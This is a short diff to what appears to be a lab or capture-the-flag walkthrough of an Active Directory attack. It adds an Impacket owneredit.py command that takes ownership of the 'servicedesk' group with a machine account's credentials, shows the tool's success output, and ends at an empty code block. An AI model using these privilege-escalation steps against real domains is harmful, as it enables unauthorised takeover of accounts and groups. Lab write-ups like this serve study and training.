@@ -269,3 +269,22 @@ This machine account has WriteOwner on the group `servicedesk`
 
 Then this group has ForceChangePassword on three users
 
+# Full control over the `servicedesk` group
+
+```python
+owneredit.py -action write -new-owner 'helpdesk01$' -target 'servicedesk' 'hsm-defense.local'/'helpdesk01$':'Password123' -k -no-pass -dc-host dc.hsm-defense.local
+Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 
+
+[-] CCache file is not found. Skipping...
+[*] Current owner information below
+[*] - SID: S-1-5-21-1508256018-1502282808-1859300581-512
+[*] - sAMAccountName: Domain Admins
+[*] - distinguishedName: CN=Domain Admins,CN=Users,DC=hsm-defense,DC=local
+[*] OwnerSid modified successfully!
+```
+
+First ill grant ownership to myself
+
+```python
+
+```
